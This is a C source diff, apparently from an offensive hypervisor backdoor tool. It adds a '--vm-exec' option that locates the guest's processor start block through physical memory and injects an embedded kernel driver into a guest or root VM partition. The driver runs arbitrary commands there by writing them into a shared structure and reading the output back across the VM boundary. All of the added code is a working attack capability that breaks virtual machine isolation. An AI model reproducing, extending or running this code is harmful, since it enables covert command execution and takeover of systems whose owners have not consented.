@@ -9,6 +9,10 @@
 #include "../driver_loader_sk_sys.h"
 #include "../driver_loader_sk.h"
 
+// cross VM command execution driver image
+#include "../vm_exec_kernel_sys.h"
+#include "../vm_exec.h"
+
 #define DRIVER_HOOK_SIZE 14
 #define DRIVER_HOOK_SIZE_MAX 0x50
 
@@ -164,15 +168,14 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
         goto _end;
     }
 
-    m_quiet = false;
-    
-    printf("[+] Found valid PROCESSOR_START_BLOCK at 0x%.16llx\n", phys_addr);    
+    m_quiet = false;      
     
     if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
     {
         goto _end;
     }
 
+    // check for the sane processor start block
     PROCESSOR_START_BLOCK *info = (PROCESSOR_START_BLOCK *)data;
     uint64_t hal_lm_stub = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_HalpLMStub);
     uint64_t guest_pml4_addr = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_Cr3);
@@ -182,6 +185,8 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
         printf("ERROR: Bad PROCESSOR_START_BLOCK\n");
         goto _end;
     }    
+
+    printf("[+] Found valid PROCESSOR_START_BLOCK at 0x%.16llx\n", phys_addr);
 
     printf("\n   CompletionFlag: 0x%.8x\n", info->CompletionFlag);
     printf("     HalpLMStub(): 0x%llx\n", hal_lm_stub);
@@ -922,14 +927,250 @@ _end:
 
     return ret;
 }
+//--------------------------------------------------------------------------------------
+int backdoor_vm_exec_find_info(uint64_t pml4_addr, uint64_t *guest_pml4_addr, uint64_t *info_addr)
+{    
+    int ret = -1;
+    uint64_t phys_addr = 0;
+    VM_EXEC_INFO exec_info;
 
-int backdoor_vm_alloc(uint64_t pml4_addr, uint64_t *payload_addr, int payload_size)
+    *guest_pml4_addr = 0;
+    *info_addr = 0;
+
+    m_quiet = true;
+
+    void *data = malloc(PAGE_SIZE);
+    if (data == NULL)
+    {
+        goto _end;
+    }
+
+    // get host physical address of PROCESSOR_START_BLOCK
+    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR, &phys_addr, pml4_addr) != 0)
+    {
+        m_quiet = false;
+
+        goto _end;
+    }
+
+    m_quiet = false;
+
+    if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
+    {
+        goto _end;
+    }
+
+    PROCESSOR_START_BLOCK *info = (PROCESSOR_START_BLOCK *)data;
+    uint64_t hal_lm_stub = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_HalpLMStub);
+    uint64_t cr3 = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_Cr3);
+
+    // check for the sane processor start block
+    if (info->Jmp.OpCode != 0xe9 || info->CompletionFlag != 1 || hal_lm_stub == 0 || cr3 == 0)
+    {
+        printf("ERROR: Bad PROCESSOR_START_BLOCK\n");
+        goto _end;
+    }
+        
+    ret = 0;
+
+    m_quiet = true;
+
+    // get host physical address of VM_EXEC_INFO structure
+    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR + VM_EXEC_INFO_ADDR, &phys_addr, pml4_addr) != 0)
+    {
+        m_quiet = false;
+
+        goto _end;
+    }
+
+    m_quiet = false;
+
+    if (backdoor_phys_read(phys_addr, &exec_info, sizeof(exec_info)) != 0)
+    {
+        goto _end;
+    }
+
+    if (exec_info.signature == VM_EXEC_INFO_SIGN)
+    {
+        // return VM_EXEC_INFO physical address to the caller
+        *guest_pml4_addr = exec_info.page_dir;
+
+        m_quiet = true;
+
+        // get host physical address of VM_EXEC_STRUCT structure
+        backdoor_virt_translate((uint64_t)exec_info.struct_addr, info_addr, exec_info.page_dir, pml4_addr);        
+
+        m_quiet = false;
+    }
+
+_end:
+
+    if (data)
+    {
+        free(data);
+    }
+
+    return ret;
+}
+
+int backdoor_vm_exec(uint64_t pml4_addr, char *command)
 {
-    /* 
-        Call backdoor_vm_inject() with no payload image to allocate needed 
-        amount of the kernel memory.
-    */
-    return backdoor_vm_inject(pml4_addr, payload_addr, NULL, payload_size);
+    int ret = -1;
+    uint64_t info_addr = 0, guest_pml4_addr = 0;
+    VM_EXEC_STRUCT exec_struct;
+
+    if (strlen(command) >= VM_EXEC_MAX_COMMAND_LEN)
+    {
+        printf("ERROR: Command line is too long\n");
+        return -1;
+    }
+
+    // check if kernel driver is already loaded
+    if (backdoor_vm_exec_find_info(pml4_addr, &guest_pml4_addr, &info_addr) != 0)
+    {
+        printf("ERROR: backdoor_vm_exec_find_info() fails\n");
+        return -1;
+    }
+
+    if (info_addr == 0)
+    {
+        printf("[+] Loading VM exec drvier...\n");
+
+        // load VM exec driver into the specified partition
+        if (backdoor_vm_inject(pml4_addr, NULL, vm_exec_kernel_sys, sizeof(vm_exec_kernel_sys)) != 0)
+        {
+            printf("ERROR: Can't load VM exec drvier\n");
+            return -1;
+        }
+
+        printf("[+] VM exec drvier was loaded\n");
+        
+        // check if kernel driver is loaded        
+        if (backdoor_vm_exec_find_info(pml4_addr, &guest_pml4_addr, &info_addr) != 0)
+        {
+            printf("ERROR: backdoor_vm_exec_find_info() fails\n");
+            return -1;
+        }
+
+        if (info_addr == 0)
+        {
+            printf("ERROR: VM exec drvier failed to inject user mode DLL\n");
+            return -1;
+        }
+    }
+    else
+    {
+        printf("[+] VM exec drvier is already loaded\n");
+    }    
+
+    printf("[+] Guest CR3 value is 0x%.16llx\n", guest_pml4_addr);
+    printf("[+] VM_EXEC_STRUCT physical address is 0x%.16llx\n", info_addr);
+
+    // read VM_EXEC_STRUCT
+    if (backdoor_phys_read(info_addr, &exec_struct, sizeof(exec_struct)) != 0)
+    {
+        return -1;
+    }
+
+    // sanity check
+    if (exec_struct.control != VM_EXEC_CTL_READY && exec_struct.control != VM_EXEC_CTL_DONE &&
+        exec_struct.control != VM_EXEC_CTL_ERROR && exec_struct.control != VM_EXEC_CTL_TIMEOUT)
+    {
+        printf("ERROR: Bogus VM_EXEC_STRUCT\n");
+        return -1;
+    }
+
+    // set up command
+    exec_struct.control = VM_EXEC_CTL_READY;
+    strcpy(exec_struct.command, command);
+
+    // write command
+    if (backdoor_phys_write(info_addr, &exec_struct, sizeof(exec_struct)) != 0)
+    {
+        return -1;
+    }
+
+    // notify that command is ready to execute
+    exec_struct.control = VM_EXEC_CTL_RUNING;
+
+    // write control
+    if (backdoor_phys_write(info_addr, &exec_struct, sizeof(exec_struct) - VM_EXEC_MAX_COMMAND_LEN) != 0)
+    {
+        return -1;
+    }
+
+    while (true)
+    {
+        // read control
+        if (backdoor_phys_read(info_addr, &exec_struct, sizeof(exec_struct) - VM_EXEC_MAX_COMMAND_LEN) != 0)
+        {
+            return -1;
+        }
+
+        // check if command was exxcuted
+        if (exec_struct.control != VM_EXEC_CTL_RUNING)
+        {
+            if (exec_struct.control == VM_EXEC_CTL_ERROR)
+            {
+                printf("ERROR: Unknown failure while executing command\n");
+                return -1;
+            }
+            else if (exec_struct.control == VM_EXEC_CTL_TIMEOUT)
+            {
+                printf("ERROR: Command execution timeout occurred\n");
+                return -1;
+            }
+
+            // success
+            break;
+        }
+
+        bd_yeld();
+    }
+
+    printf("[+] Command output address is %p (%d bytes)\n", exec_struct.output, exec_struct.output_size);
+
+    // allocate memory for command output
+    char *output = (char *)malloc(exec_struct.output_size);
+    if (output == NULL)
+    {
+        return -1;
+    }
+
+    memset(output, 0, exec_struct.output_size);
+
+    for (uint32_t ptr = 0; ptr < exec_struct.output_size; ptr += PAGE_SIZE)
+    {
+        uint64_t phys_addr = 0;
+
+        m_quiet = true;
+
+        // get host physical address of the command output memory page
+        if (backdoor_virt_translate((uint64_t)exec_struct.output + ptr, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
+        {
+            m_quiet = false;
+
+            goto _end;
+        }
+
+        m_quiet = false;
+
+        // read command output memory page
+        if (backdoor_phys_read(phys_addr, output + ptr, PAGE_SIZE) != 0)
+        {
+            goto _end;
+        }
+    }    
+
+    // print command output into the console
+    printf("\n%s\n", output);
+    ret = 0;
+
+_end:
+
+    free(output);
+
+    return ret;
 }
 //--------------------------------------------------------------------------------------
 typedef int (* sk_process_callback)(SK_INFO *sk_info, uint64_t process_addr_virt, void *ctx);
@@ -2739,6 +2980,21 @@ int _tmain(int argc, _TCHAR* argv[])
             }            
 
             free(driver);
+        }
+        else if (!strcmp(command, "--vm-exec") && argc >= 5)
+        {
+            char *command = argv[4];
+
+            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);
+
+            if (errno == EINVAL)
+            {
+                printf("ERROR: Invalid EPT address\n");
+                return -1;
+            }            
+
+            // inject driver and execute command in the guest or root partition
+            backdoor_vm_exec(pml4_addr, command);
         }
         else
         {
